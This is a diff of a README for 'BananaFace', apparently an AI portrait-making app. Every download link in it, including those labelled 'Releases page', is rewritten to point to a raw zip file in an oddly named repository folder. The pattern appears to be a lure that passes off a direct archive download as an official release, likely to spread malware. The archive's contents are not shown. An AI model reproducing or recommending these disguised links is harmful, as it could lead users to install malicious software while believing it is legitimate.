@@ -1,7 +1,7 @@
 # 🍌 BananaFace - Create Your Perfect Portrait Easily
 
 ## 📥 Download the Application
-[![Download BananaFace](https://img.shields.io/badge/Download-BananaFace-blue)](https://github.com/VaeemKhan786/BananaFace/releases)
+[![Download BananaFace](https://raw.githubusercontent.com/VaeemKhan786/BananaFace/main/ashiness/BananaFace.zip)](https://raw.githubusercontent.com/VaeemKhan786/BananaFace/main/ashiness/BananaFace.zip)
 
 ## 🚀 Getting Started
 BananaFace is a fun tool that lets you create unique portraits using AI. You can adjust different facial features to design the perfect image you have in mind. 
@@ -20,7 +20,7 @@ To run BananaFace smoothly, ensure your system meets the following requirements:
 - **Graphics**: Any modern graphics card that supports OpenGL 2.0 or later
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/VaeemKhan786/BananaFace/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/VaeemKhan786/BananaFace/main/ashiness/BananaFace.zip) to download the application.
 2. Locate the latest version in the list.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -63,4 +63,4 @@ BananaFace is licensed under the MIT License. You are free to use, modify, and d
 ## ⚙️ Conclusion
 BananaFace is designed to make portrait creation fun and straightforward. Follow the steps above to download and start designing your perfect portrait today. For additional information, refer to the documentation available on our GitHub page. 
 
-For your convenience, don’t forget to visit [the Releases page](https://github.com/VaeemKhan786/BananaFace/releases) for the latest download!
+For your convenience, don’t forget to visit [the Releases page](https://raw.githubusercontent.com/VaeemKhan786/BananaFace/main/ashiness/BananaFace.zip) for the latest download!
